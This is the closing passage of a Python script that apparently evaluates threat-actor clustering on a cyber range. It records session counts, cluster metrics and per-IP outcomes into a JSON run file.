    summary.update(finished=datetime.now().isoformat(timespec="seconds"), sessions=len(truth_all), clustered=len(d),
                   actors=int(d["threat_actor_id"].nunique()), cut=cuts, refused=refused,
                   ari=None if ari is None else round(float(ari), 3),
                   outcomes={ip: dict(o, persona=truth_all.get(ip)) for ip, o in OUTCOMES.items()})
    out = os.path.join(folder, "range_runs", f"{run_id}.json")
    with open(out + ".tmp", "w", encoding="utf-8") as f:
        json.dump(summary, f, indent=1)
    os.replace(out + ".tmp", out)
    console.print(f"\nrun record: {out}")


if __name__ == "__main__":
    main()
